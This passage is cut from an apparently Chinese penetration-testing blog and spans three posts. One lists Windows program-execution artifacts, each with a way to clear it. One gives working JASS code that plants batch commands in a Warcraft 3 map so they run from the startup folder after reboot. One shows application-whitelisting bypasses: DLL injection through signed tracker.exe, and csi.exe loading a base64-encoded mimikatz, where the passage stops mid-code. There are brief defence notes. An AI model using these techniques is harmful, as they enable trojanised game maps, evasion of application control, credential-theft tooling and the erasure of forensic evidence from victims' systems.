</code></pre></div></div>

<p>数据未加密</p>

<p>记录实时更新</p>

<h4 id="解析工具-2">解析工具</h4>

<p>(1)</p>

<p>命令行解析</p>

<p>http://www.nirsoft.net/utils/muicache_view.html</p>

<p>用法示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MUICacheView.exe  /stext out.txt
</code></pre></div></div>

<p>(2)直接查询注册表</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query "HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
</code></pre></div></div>

<h4 id="清除记录的方法-3">清除记录的方法</h4>

<p>清除对应的注册表键值</p>

<h3 id="4runmru">4、RunMRU</h3>

<p>参考资料：</p>

<p>http://www.forensicfocus.com/a-forensic-analysis-of-the-windows-registry</p>

<p>保存输入Win+U启动程序的历史记录</p>

<p>位置：</p>

<p>当前用户：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
</code></pre></div></div>

<p>所有用户：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKEY_USERS\&lt;sid&gt;\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
</code></pre></div></div>

<p>数据未加密</p>

<p>记录实时更新</p>

<h4 id="解析工具-3">解析工具</h4>

<p>(1)直接查询注册表</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
</code></pre></div></div>

<h4 id="清除记录的方法-4">清除记录的方法</h4>

<p>清除对应的注册表键值</p>

<h3 id="5appcompatflags-registry-keys">5、AppCompatFlags Registry Keys</h3>

<p>参考资料：</p>

<p>https://journeyintoir.blogspot.com/2013/12/revealing-program-compatibility.html</p>

<p>保存程序执行记录</p>

<p>位置：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers
HKCU\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers
HKCU\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted
HKCU\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store
</code></pre></div></div>

<h4 id="解析工具-4">解析工具</h4>

<p>(1)直接查询注册表</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"
reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"
reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted"
reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store"
</code></pre></div></div>

<h4 id="清除记录的方法-5">清除记录的方法</h4>

<p>清除对应的注册表键值</p>

<h2 id="0x04-从文件获得文件执行记录">0x04 从文件获得文件执行记录</h2>
<hr>

<h3 id="1prefetch">1、Prefetch</h3>

<p>参考资料：</p>

<p>https://www.forensicmag.com/article/2010/12/decoding-prefetch-files-forensic-purposes-part-1</p>

<p>预读取文件夹，用来存放系统已访问过文件的预读信息，能够加快系统的启动速度</p>

<p>记录文件运行次数、上次执行时间、Hash等</p>

<p>查看该功能是否开启：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher
</code></pre></div></div>

<ul>
  <li>0 = Disabled</li>
  <li>1 = Only Application launch prefetching enabled</li>
  <li>2 = Only Boot prefetching enabled</li>
  <li>3 = Both Application launch and Boot prefetching enabled</li>
</ul>

<p>位置：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Prefetch
</code></pre></div></div>

<p>数据以固定格式保存，扩展名为pf</p>

<h4 id="解析工具-5">解析工具</h4>

<p>(1)</p>

<p>命令行解析</p>

<p>源代码开源(c#)</p>

<p>https://github.com/EricZimmerman/PECmd</p>

<p>用法示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PECmd.exe -d C:\Windows\Prefetch --csv c:\temp
</code></pre></div></div>

<p>生成两个文件”time”_PECmd_Output.csv和”time”_PECmd_Output_Timeline.csv</p>

<p>“time”_PECmd_Output.csv保存详细信息</p>

<p>“time”_PECmd_Output_Timeline.csv只保存文件的名称列表</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PECmd.exe -d C:\Windows\Prefetch --json c:\temp
</code></pre></div></div>

<p>生成多个json文件，每个pf文件对应一个json文件</p>

<h4 id="清除记录的方法-6">清除记录的方法</h4>

<p>删除对应文件名的pf文件</p>

<h3 id="2amcache">2、Amcache</h3>

<p>参考资料：</p>

<p>https://journeyintoir.blogspot.com/2013/12/revealing-recentfilecachebcf-file.html</p>

<p>http://www.swiftforensics.com/2013/12/amcachehve-in-windows-8-goldmine-for.html</p>

<p>用来跟踪应用程序与不同可执行文件的兼容性问题</p>

<p>数据以固定格式保存</p>

<p>位置：</p>

<p>Win7：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\AppCompat\Programs\RecentFileCache.bcf
</code></pre></div></div>

<p>只记录文件名称</p>

<p>Win8及以上：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\AppCompat\Programs\Amcache.hve
</code></pre></div></div>

<p>记录创建时间、上次修改时间、SHA1和一些PE文件头信息</p>

<p><strong>注：</strong></p>

<p>Win7系统安装KB2952664后，也会支持Amcache.hve，也就是说，RecentFileCache.bcf和Amcache.hve都包含文件执行记录</p>

<h4 id="解析工具recentfilecachebcf">解析工具(RecentFileCache.bcf)</h4>

<p>(1)</p>

<p>源代码开源(c#)</p>

<p>https://github.com/jwhwan9/dumpBCF</p>

<p>(2)</p>

<p>源代码开源(python)</p>

<p>https://github.com/prolsen/recentfilecache-parser</p>

<p>用法示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rfcparse.py -f C:\Windows\AppCompat\Programs\RecentFileCache.bcf
</code></pre></div></div>

<h4 id="解析工具amcachehve">解析工具(Amcache.hve)</h4>

<p>(1)</p>

<p>命令行解析</p>

<p>源代码开源(c#)</p>

<p>https://github.com/EricZimmerman/AmcacheParser</p>

<p>用法示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AmcacheParser.exe -f C:\Windows\AppCompat\Programs\Amcache.hve --csv c:\test
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>某些情况下会无法导出，提示系统正在占用文件Amcache.hve</p>

<p>(2)</p>

<p>源代码开源(python)</p>

<p>https://github.com/williballenthin/python-registry/blob/master/samples/amcache.py</p>

<p>(3)</p>

<p>源代码开源(powershell)</p>

<p>https://github.com/yoda66/GetAmCache/blob/master/Get-Amcache.ps1</p>

<h4 id="清除记录的方法recentfilecachebcf">清除记录的方法(RecentFileCache.bcf)</h4>

<p>修改文件</p>

<p>详细方法将在下篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-RecentFileCache.bcf%E5%92%8CAmcache.hve%E5%8D%95%E6%9D%A1%E8%AE%B0%E5%BD%95%E7%9A%84%E6%B8%85%E9%99%A4/">《渗透技巧——RecentFileCache.bcf和Amcache.hve单条记录的清除》</a>介绍</p>

<h4 id="清除记录的方法amcachehve">清除记录的方法(Amcache.hve)</h4>

<p>修改文件</p>

<p>详细方法将在下篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-RecentFileCache.bcf%E5%92%8CAmcache.hve%E5%8D%95%E6%9D%A1%E8%AE%B0%E5%BD%95%E7%9A%84%E6%B8%85%E9%99%A4/">《渗透技巧——RecentFileCache.bcf和Amcache.hve单条记录的清除》</a>介绍</p>

<h3 id="3jumplists">3、JumpLists</h3>

<p>参考资料：</p>

<p>https://articles.forensicfocus.com/2012/10/30/forensic-analysis-of-windows-7-jump-lists/</p>

<p>用来记录用户最近使用的文档和应用程序，通常显示在任务栏中</p>

<p>位置：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%APPDATA%\Microsoft\Windows\Recent
</code></pre></div></div>

<p>数据未加密</p>

<p>记录实时更新</p>

<h4 id="解析工具-6">解析工具</h4>

<p>(1)</p>

<p>直接查询文件夹</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir %APPDATA%\Microsoft\Windows\Recent
</code></pre></div></div>

<h4 id="清除记录的方法-7">清除记录的方法</h4>

<p>清除路径下的文件</p>

<h3 id="4srum">4、SRUM</h3>

<p>Win8及以上系统支持</p>

<p>参考资料：</p>

<p>https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1492184583.pdf</p>

<p>包括多种信息，其中包括程序执行时间</p>

<p>数据加密</p>

<p>记录实时更新</p>

<h4 id="解析工具-7">解析工具</h4>

<p>(1)</p>

<p>命令行解析</p>

<p>源代码开源(python)</p>

<p>https://github.com/MarkBaggett/srum-dump</p>

<p>用法示例：</p>

<p>需要模板文件SRUM_TEMPLATE.xlsx</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>srum_dump.exe --SRUM_INFILE c:\Windows\system32\sru\SRUDB.dat
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>我在测试的过程中发现上面的命令有问题，执行失败，提示<code class="language-plaintext highlighter-rouge">ESE File Not found: C:\Windows\System32\sru\SRUDB.dat</code></p>

<p>需要将SRUDB.dat复制到另一目录，再进行解析</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>srum_dump.exe --SRUM_INFILE SRUDB.dat
</code></pre></div></div>

<h4 id="清除记录的方法-8">清除记录的方法</h4>

<p>(留在以后介绍)</p>

<h2 id="0x05-防御建议">0x05 防御建议</h2>
<hr>

<p>不同系统支持不同方法，如下图：</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-14/4-1.png" alt="Alt text"></p>

<p>图片截取自https://1234n6-my.sharepoint.com/:x:/p/adam/EU3Fk3ec6NdPsSQx1eA1sfwB_R_fRa4tJ4c1FR6WJlWIEA?e=GRyu7r</p>

<p>站在防御的角度，可以选择定期清理系统中的文件执行记录</p>

<p>站在取证的角度，攻击者能够对文件执行记录进行修改和删除，所以对这些记录不能盲目相信</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文对Windows主机(Win7及以上系统)常见文件执行记录的位置进行整理，通过实际测试验证了Windows系统可记录的内容，分析了部分记录的清除方法。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on October 30, 2018
  </div>

  
</article><article class="post">
  <h1>War3地图“漏洞”分析介绍</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>
<p>最近腾讯电脑管家团队对利用《魔兽争霸3》漏洞传播的“萝莉”蠕虫进行了分析，介绍了“萝莉”蠕虫的运行流程。接着该“蠕虫”的作者在其网站对此做了澄清，我们暂且不八卦这个事件，只在技术层面分析一下这个《魔兽争霸3》漏洞到底是什么，如何利用以及如何防御。</p>

<p><strong>“萝莉”蠕虫分析地址：</strong>
http://www.freebuf.com/news/120136.html</p>

<p><strong>“蠕虫”的作者博客地址：</strong>
https://blog.loxve.com/</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>该《魔兽争霸3》漏洞的流程如下：</p>

<p>1.攻击者上传修改过的魔兽地图，等待其他玩家进入房间游戏</p>

<p>2.玩家进入房间后，由于本地没有该地图，所以会自动下载该地图</p>

<p>3.地图同步后，玩家进入游戏，触发地图中的脚本，该脚本在启动目录写入bat文件</p>

<p>4.玩家电脑重启后，启动目录中的bat文件被执行，成功加载payload</p>

<h2 id="0x02-相关概念">0x02 相关概念</h2>
<hr>

<h3 id="jass">JASS</h3>

<p>是《魔兽争霸3》的脚本语言，用于控制地图的进程和行为, 是魔兽游戏和地图的基础</p>

<p>正常的地图编辑中摆放的单位(Unit), 设置的触发(Trigger)等最终都会被翻译成JASS语言，保存在地图文件中，在游戏运行时被调用</p>

<h3 id="hkew3mmodifier">HkeW3mModifier</h3>

<p>是一个修改MPQ格式文件的工具，可用来修改加密过的mpq文件，带有强大的资源搜索功能，可以搜索出魔兽地图中大部分资源、重建列表，智能解压相关贴图</p>

<p>可用来查看和编辑地图中包含的文件资源</p>

<p><strong>操作说明：</strong></p>

<p>下载HkeW3mModifier.exe，选择地图，点击分析文件查看地图中包含的文件列表，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-22/1-1.png" alt="Alt text"></p>

<p>其中，war3map.j包含地图的逻辑控制代码，右键解压war3map.j后可查看其中的代码，部分代码如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-22/1-2.png" alt="Alt text"></p>

<h3 id="war3mapj中的文件结构">war3map.j中的文件结构</h3>

<p>1、变量声明</p>

<p>声明了脚本文件中使用的全局变量
Lost Temple中的变量声明如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//***************************************************************************
//*
//*  Global Variables
//*
//***************************************************************************

globals
    // Generated
    trigger                 gg_trg_Melee_Initialization = null
endglobals

function InitGlobals takes nothing returns nothing
endfunction
</code></pre></div></div>

<p>2、触发器部分</p>

<p>声明了地图中使用的触发器</p>

<p>Lost Temple中的触发器部分如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//***************************************************************************
//*
//*  Triggers
//*
//***************************************************************************

//===========================================================================
// Trigger: Melee Initialization
//
// Default melee game initialization for all players
//===========================================================================
function Trig_Melee_Initialization_Actions takes nothing returns nothing
    call MeleeStartingVisibility(  )
    call MeleeStartingHeroLimit(  )
    call MeleeGrantHeroItems(  )
    call MeleeStartingResources(  )
    call MeleeClearExcessUnits(  )
    call MeleeStartingUnits(  )
    call MeleeStartingAI(  )
    call MeleeInitVictoryDefeat(  )
endfunction

//===========================================================================
function InitTrig_Melee_Initialization takes nothing returns nothing
    set gg_trg_Melee_Initialization = CreateTrigger(  )
    call TriggerAddAction( gg_trg_Melee_Initialization, function Trig_Melee_Initialization_Actions )
endfunction

//===========================================================================
function InitCustomTriggers takes nothing returns nothing
    call InitTrig_Melee_Initialization(  )
endfunction

//===========================================================================
function RunInitializationTriggers takes nothing returns nothing
    call ConditionalTriggerExecute( gg_trg_Melee_Initialization )
endfunction
</code></pre></div></div>

<p>根据函数名称能够猜出表示的意思</p>

<p>function Trig_Melee_Initialization_Actions为触发器进行的操作</p>

<p>function InitTrig_Melee_Initialization用来初始化</p>

<p>function InitCustomTriggers为用户自定义触发器的注册</p>

<p>function RunInitializationTriggers的功能是运行触发器</p>

<p>3、主函数main</p>

<p>脚本文件的入口</p>

<p>Lost Temple中的main部分如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//***************************************************************************
//*
//*  Main Initialization
//*
//***************************************************************************

//===========================================================================
function main takes nothing returns nothing
    call SetCameraBounds( -7936.0 + GetCameraMargin(CAMERA_MARGIN_LEFT), -8192.0 + GetCameraMargin(CAMERA_MARGIN_BOTTOM), 7936.0 - GetCameraMargin(CAMERA_MARGIN_RIGHT), 7680.0 - GetCameraMargin(CAMERA_MARGIN_TOP), -7936.0 + GetCameraMargin(CAMERA_MARGIN_LEFT), 7680.0 - GetCameraMargin(CAMERA_MARGIN_TOP), 7936.0 - GetCameraMargin(CAMERA_MARGIN_RIGHT), -8192.0 + GetCameraMargin(CAMERA_MARGIN_BOTTOM) )
    call SetDayNightModels( "Environment\\DNC\\DNCLordaeron\\DNCLordaeronTerrain\\DNCLordaeronTerrain.mdl", "Environment\\DNC\\DNCLordaeron\\DNCLordaeronUnit\\DNCLordaeronUnit.mdl" )
    call NewSoundEnvironment( "Default" )
    call SetAmbientDaySound( "LordaeronSummerDay" )
    call SetAmbientNightSound( "LordaeronSummerNight" )
    call SetMapMusic( "Music", true, 0 )
    call CreateAllUnits(  )
    call InitBlizzard(  )
    call InitGlobals(  )
    call InitCustomTriggers(  )
    call RunInitializationTriggers(  )

endfunction
</code></pre></div></div>

<p>4、其他设置</p>

<p>如Unit Item Tables、Unit Creation、Players、Map Configuration暂略</p>

<h2 id="0x03-jass预读文件漏洞">0x03 Jass预读文件漏洞</h2>
<hr>

<p><strong>Reference:</strong></p>

<p>http://bbs.islga.org/forum.php?mod=viewthread&amp;tid=48422&amp;extra=page%3D1&amp;page=1</p>

<p>JASS中三个特殊的函数：</p>

<ul>
  <li>native PreloadGenClear  takes nothing returns nothing</li>
  <li>native PreloadGenStart  takes nothing returns nothing</li>
  <li>native PreloadGenEnd    takes string filename returns nothing</li>
</ul>

<p>以上三个函数用来记录PreloadGenStart()和PreloadGenEnd()之间执行的所有Preload()语句，并将它们写入到PreloadGenEnd()函数指定的pld文件里去</p>

<p><strong>注：</strong></p>

<p>类似于输出日志文件</p>

<p><strong>示例：</strong></p>

<p>JASS代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Test takes nothing returns nothing
    call PreloadGenClear()
    call PreloadGenStart()
    call Preload( "ReplaceableTextures \\CameraMasks\\White_mask.blp" )
    call PreloadGenEnd("c:\\test\\test.pld")
endfunction
</code></pre></div></div>

<p>执行函数Test()后，就会在c:\test\下新建文件test.pld，并写入如下内容：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Test takes nothing returns nothing
    call Preload( "ReplaceableTextures \\CameraMasks\\White_mask.blp" )
    call PreloadEnd( 0.0 )
endfunction
</code></pre></div></div>

<h3 id="漏洞原理">漏洞原理</h3>

<h3 id="1设置输出为bat文件">1、设置输出为bat文件</h3>

<p>如果将输出的.pld文件后缀名改为.bat，那么文件中的每一行被当作一段代码被执行（当然语句无效，不符合批处理的语法），如图
<img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-22/2-1.png" alt="Alt text"></p>

<h3 id="2加入换行符n">2、加入换行符\n</h3>
<p>在批处理的语法中，\n代表换行。虽然.pld文件输出的每行内容格式固定，但是，如果通过<code class="language-plaintext highlighter-rouge">\n</code>把call Preload()这一行中的内容截断，那么就能够实现在新的一行显示一条可被执行的批处理命令</p>

<p><strong>示例：</strong></p>

<p>JASS代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Test takes nothing returns nothing
    call PreloadGenClear()
    call PreloadGenStart()
    call Preload("\n@echo Test\n")
    call PreloadGenEnd("c:\\test\\test.bat")
endfunction
</code></pre></div></div>

<p>输出成test.bat后会包含换行符，输出的文件内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Test takes nothing returns nothing
    call Preload( "
@echo Test
" )
    call PreloadEnd( 0.0 )
endfunction
</code></pre></div></div>

<p>此时，产生了新的一行代码<code class="language-plaintext highlighter-rouge">@echo Test</code>，<code class="language-plaintext highlighter-rouge">@echo Test</code>得到执行，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-22/2-2.png" alt="Alt text"></p>

<h3 id="3执行批处理">3、执行批处理</h3>

<p>默认JASS只能做到输出文件，无法执行文件，所以只能将文件输出到文件启动项下，在重启后得到执行</p>

<h2 id="0x04-实际测试">0x04 实际测试</h2>
<hr>

<h3 id="1测试helloga2012w3m">1、测试HelloGA2012.w3m</h3>

<p><strong>下载地址：</strong></p>

<p>http://bbs.islga.org/forum.php?mod=viewthread&amp;tid=48422&amp;extra=page%3D1&amp;page=1中的附件</p>

<p>war3版本：1.27.0.52240</p>

<p>加载地图HelloGA2012进入游戏后，按Esc键，如图，弹出提示，在D:\XX\下产生文件test.pld</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-22/3-1.png" alt="Alt text">
跳到目录D:\XX\，找到test.pld，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function PreloadFiles takes nothing returns nothing

  call Preload( "
@cls
@color a
@echo Hello World
@echo This is a sample of WC3 map generated BAT file.
@echo Welcome to http://bbs.islga.org. Let's go 2012 with GA!
@pause
@exit
" )
  call PreloadEnd( 0.0 )

endfunction
</code></pre></div></div>

<p>测试成功</p>

<h3 id="2手动修改官方地图losttemple">2、手动修改官方地图LostTemple</h3>

<p>(1) 获得源文件</p>

<p>使用HkeW3mModifier打开官方地图<code class="language-plaintext highlighter-rouge">(4)LostTemple.w3m</code>，导出war3map.j</p>

<p>(2) 添加payload</p>

<p>根据上文对war3map.j中文件结构的分析，在<code class="language-plaintext highlighter-rouge">function Trig_Melee_Initialization_Actions</code>内添加如下代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>call PreloadGenClear()
call PreloadGenStart()
call Preload("\n@echo Test\n")
call PreloadGenEnd("c:\\test\\test.bat")
</code></pre></div></div>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-22/3-2.png" alt="Alt text"></p>

<p>(3) 保存</p>

<p>保存war3map.j后，在HkeW3mModifier选择替换(添加)文件，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-22/3-3.png" alt="Alt text"></p>

<p>选择重压缩，保存地图文件，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-22/3-4.png" alt="Alt text"></p>

<p>(4) 测试</p>

<p>将地图置于Maps文件夹下，进入游戏，地图被识别，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-22/4-1.png" alt="Alt text"></p>

<p><strong>注：</strong>
为便于测试，已将地图名称修改为Test；覆盖原地图，迷惑性更大</p>

<p>开始游戏，c:\test\下产生文件test.bat，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function PreloadFiles takes nothing returns nothing

  call Preload( "
@echo Test
" )
  call PreloadEnd( 0.0 )

endfunction
</code></pre></div></div>
<p>如果将该文件输出到开机自启动目录，那么在重启后，文件将会执行</p>

<p>测试成功</p>

<h2 id="0x05-补充">0x05 补充</h2>
<hr>

<p>1、这个漏洞本身并不包含代码执行的功能，所以漏洞成功利用的关键在于找到一个执行代码的方法，最直接的方式为将文件输出到启动项中，当然，也可利用该漏洞实现对指定文件的修改</p>

<p>2、dota地图中war3map.j的位置为scripts\war3map.j,同样可以利用</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>严格意义来讲，这个《魔兽争霸3》漏洞并不是一个漏洞，只是war3地图中支持一个输出文件的正常功能，利用这个功能，将精心构造的代码输出到特定位置，再配合其他方式来执行它。</p>

<p>所以该漏洞利用的关键在于执行的方式，通用方法无非就是写开机启动项。</p>

<p>对于普通用户来讲，注意本机的开机启动项目录就好，同时，杀毒软件也已经能够检测到该利用方式。</p>

<p>注意自我保护，谨防受骗上当。</p>

<p>适度游戏益脑，沉迷游戏伤身。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on November 22, 2016
  </div>

  
</article><article class="post">
  <h1>Study Notes Weekly No.4(Use tracker to load dll &amp; Use csi to bypass UMCI &amp; Execute C# from XSLT file)</h1>

  <div class="entry">
    <p><strong>About:</strong></p>

<ul>
  <li>
    <p>use tracker to load dll</p>
  </li>
  <li>
    <p>use csi to bypass Application Whitelisting</p>
  </li>
  <li>
    <p>execute C# from XSLT file</p>
  </li>
</ul>

<p><strong>目录:</strong></p>

<ul>
  <li>
    <p>介绍利用tracker.exe加载dll的方法</p>
  </li>
  <li>
    <p>如何利用csi.exe绕过Windows Device Guard</p>
  </li>
  <li>
    <p>在XSLT文件转换过程中执行C#代码</p>
  </li>
</ul>

<h2 id="0x01-use-tracker-to-load-dll">0x01 use tracker to load dll</h2>
<hr>

<p><strong>Reference:</strong></p>

<p>https://twitter.com/subTee/status/793151392185589760</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/2-1.png" alt="Alt text"></p>

<p><strong>简介：</strong></p>

<p>Casey在Twitter分享的一个技巧，利用tracker.exe能够创建进程，注入dll，特别的是tracker.exe来自于SDK中，包含微软的数字签名，本文将要分享利用该技巧的一些心得,补充一个直接利用tracker.exe加载dll的技巧</p>

<p><strong>Tracker.exe：</strong></p>

<p>Tracker.exe is used to start a process and inject FileTracker.dll into it just after creation.</p>

<p>The file accesses of the target process are tracked, and written to a .tlog file</p>

<p>常见目录(需要安装SDK):</p>

<ul>
  <li>
    <p>C:\Program Files (x86)\Microsoft SDKs\Windows\v8.1A\bin\NETFX 4.5.1 Tools</p>
  </li>
  <li>
    <p>C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.6.1 Tools\x64</p>
  </li>
</ul>

<p><strong>语法：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Tracker.exe [选项] [@跟踪器响应文件] /c [命令行]

 /d 文件.dll                : 使用跟踪 dll 文件.dll 启动进程。(默认值: 通过 PATH 提供的 FileTracker.dll)

 /i[f] &lt;路径&gt;               :  用于跟踪日志输出的中间目录。(使用 /if 可立即将路径展开为完整路径)(默认值: 所跟踪进程中的当前目录)

 /o                         : 对每个文件执行跟踪操作

 /m                         : 在跟踪日志中包含缺少的文件，即在进程关闭之前删除的那些文件

 /u                         : 不从跟踪日志中删除重复的文件操作

 /t                         : 跟踪命令行(将展开使用“@文件名”语法指定的响应文件)

 /a                         : 启用扩展跟踪: GetFileAttributes、GetFileAttributesEx

 /e                         : 启用扩展跟踪: GetFileAttributes、GetFileAttributesEx、RemoveDirectory、CreateDirectory

 /k                         : 在跟踪日志文件名中保留完整的工具链

 /r 文件 1;文件 2;..;文件 n : 正在跟踪的主要根输入文件(默认值: 无)

 /c [命令行]                : 要跟踪的命令(必须是最后一个参数)

 /?                         : 本帮助文本
</code></pre></div></div>

<p><strong>实际测试：</strong></p>

<p>cmd下运行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Tracker.exe /d test.dll /c cmd.exe
</code></pre></div></div>

<p>如图，成功加载test.dll</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/2-2.png" alt="Alt text"></p>

<p>test.dll为默认包含导出函数的dll就好，示例代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include "stdafx.h"
#include &lt;windows.h&gt;
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
           )
{
  switch (ul_reason_for_call)
  {
  case DLL_PROCESS_ATTACH:
    MessageBox(NULL,L"testexport", L"testexport",MB_OK);
  case DLL_THREAD_ATTACH:
  case DLL_THREAD_DETACH:
  case DLL_PROCESS_DETACH:
    break;
  }
  return TRUE;
}
</code></pre></div></div>

<p><strong>分析：</strong></p>

<p>这个技巧有如下特点：</p>

<ul>
  <li>
    <p>tracker.exe包含微软数字签名，可绕过应用程序白名单的限制</p>
  </li>
  <li>
    <p>tracker.exe可以在启动进程的同时加载dll</p>
  </li>
</ul>

<p>但是如果只想通过tracker.exe加载dll的话，存在以下问题：</p>

<p>选择不存在或是权限不够的进程，无法加载dll</p>

<p>但是，可以通过一个特殊的进程来解决这个问题，如<code class="language-plaintext highlighter-rouge">svchost.exe</code>，那么在加载dll后，进程svchost.exe可以自动退出,这就实现了通过tracker.exe加载dll</p>

<p><strong>防御：</strong></p>

<p>对tracker.exe添加黑名单规则</p>

<h2 id="0x02-use-csi-to-bypass-application-whitelisting">0x02 use csi to bypass Application Whitelisting</h2>
<hr>

<p><strong>Reference:</strong></p>

<p>http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html</p>

<p><strong>简介：</strong></p>

<p>同样是利用带有微软签名的exe绕过白名单的技巧，Matt Graeber曾介绍过如何利用cdb.exe绕过Windows Device Guard，Casey这次介绍的是使用C#相关的csi.exe绕过Windows Device Guard的技巧，本文将分享这个技巧的研究心得，并完成Casey在博客中留给读者的作业——在win10未安装VS2015的环境下如何使用csi.exe</p>

<p><strong>csi.exe：</strong></p>

<p>在Visual Studio 2015 Update 1引入</p>

<p>安装后位置在C:\Program Files (x86)\MSBuild\14.0\Bin</p>

<p><strong>实际测试：</strong></p>

<p>测试系统：</p>

<p>Win10 安装Visual Studio 2015</p>

<p><strong>1.在csi编译环境中直接执行代码</strong></p>

<p>直接运行csi.exe会进入编译环境，可在里面直接填入代码并运行</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/3-1.png" alt="Alt text"></p>

<p>测试Casey在文章中的代码，从文件中读取base64加密过的mimikatz.exe，解密执行，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
using System.Reflection;
string s = System.IO.File.ReadAllText(@"c:\\test\\katz.txt");
byte[] b = System.Convert.FromBase64String(s);
Assembly a = Assembly.Load(b);
